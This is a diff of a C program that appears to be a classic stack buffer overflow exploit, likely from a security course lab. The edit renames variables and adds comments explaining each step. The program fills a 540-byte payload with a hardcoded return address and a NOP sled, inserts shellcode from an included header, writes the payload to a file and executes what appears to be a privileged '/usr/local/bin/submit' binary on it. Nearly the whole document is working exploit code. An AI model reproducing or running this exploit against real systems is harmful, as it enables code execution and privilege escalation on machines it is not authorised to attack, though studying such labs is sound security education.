@@ -6,43 +6,48 @@
 #include <unistd.h>
 #include </usr/local/src/shellcode.h>
 
-#define BUF_SIZE (540)
+#define PAYLOAD_SIZE (540)
 #define NOP (0x90)
 
 int main(int argc, char **argv) {
-	char buf[BUF_SIZE], *it, *args[4];
+	char payload[PAYLOAD_SIZE], *it, *args[4];
 	int i;
 	const int slen = strlen(shellcode);
-	const int halfway = BUF_SIZE / 2;
+	const int halfway = PAYLOAD_SIZE / 2;
 	long *addr_ptr;
-	FILE *dest;
+	FILE *payload_file;
+
+	/* The address of the target buffer */
 	long *addr = (long*) 0xffbfdc58;
 
-	addr_ptr = (long*) buf;
-	for (i = 0; i < BUF_SIZE; i+=4) {
+	/* Fill the payload with the address of the target buffer */
+	addr_ptr = (long*) payload;
+	for (i = 0; i < PAYLOAD_SIZE; i+=4) {
 		*(addr_ptr++) = (long) addr;
 	}
 
-	memset(buf, NOP, halfway);
+	/* Padding NOP's to the first-half of the payload */
+	memset(payload, NOP, halfway);
 
-	it = buf + (halfway - slen/2);
+	/* Put the shell code into the payload */
+	it = payload + (halfway - slen/2);
 	memcpy(it, shellcode, slen);
 
-	if ((dest = fopen("out", "w+")) == NULL) {
-		puts("Cannot open 'out' for writing the shellcode");
-		return 1;
+	/* Dump the payload into a file called "out" */
+	if ((payload_file = fopen("out", "w+")) == NULL) {
+		puts("Cannot open 'out' for writing the payload");
+		return -1;
 	}
 
-	fprintf(dest, "%s", buf);
-	fclose(dest);
+	fprintf(payload_file, "%s", payload);
+	fclose(payload_file);
 
+	/* set up arguments and then run the exploit */
 	args[0] = "/usr/local/bin/submit";
 	args[1] = "out";
 	args[2] = "whatever";
 	args[3] = NULL;
 
-	execve("/usr/local/bin/submit", args, NULL);
-
-	// MUST NOT REACH
-	return 1;
+	// return -1 means error; otherwise will do return
+	return execve(args[0], args, NULL);
 }
